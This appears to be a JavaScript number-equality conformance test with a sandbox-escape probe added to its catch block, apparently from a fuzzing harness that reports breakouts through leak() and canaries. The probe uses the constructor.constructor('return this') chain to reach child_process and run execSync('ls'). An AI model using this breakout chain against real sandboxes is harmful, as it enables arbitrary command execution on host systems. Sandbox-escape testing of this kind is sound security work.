try {
    if (Number.POSITIVE_INFINITY !== Number.POSITIVE_INFINITY) {
        $ERROR('#1: +Infinity === +Infinity');
    }
    if (Number.NEGATIVE_INFINITY !== Number.NEGATIVE_INFINITY) {
        $ERROR('#2: -Infinity === -Infinity');
    }
    if (13 !== 13) {
        $ERROR('#3: 13 === 13');
    }
    if (-13 !== -13) {
        $ERROR('#4: -13 === -13');
    }
    if (1.3 !== 1.3) {
        $ERROR('#5: 1.3 === 1.3');
    }
    if (-1.3 !== -1.3) {
        $ERROR('#6: -1.3 === -1.3');
    }
    if (Number.POSITIVE_INFINITY !== -Number.NEGATIVE_INFINITY) {
        $ERROR('#7: +Infinity === -(-Infinity)');
    }
    if (!(1 !== 0.999999999999)) {
        $ERROR('#8: 1 !== 0.999999999999');
    }
    if (1 !== 1) {
        $ERROR('#9: 1.0 === 1');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}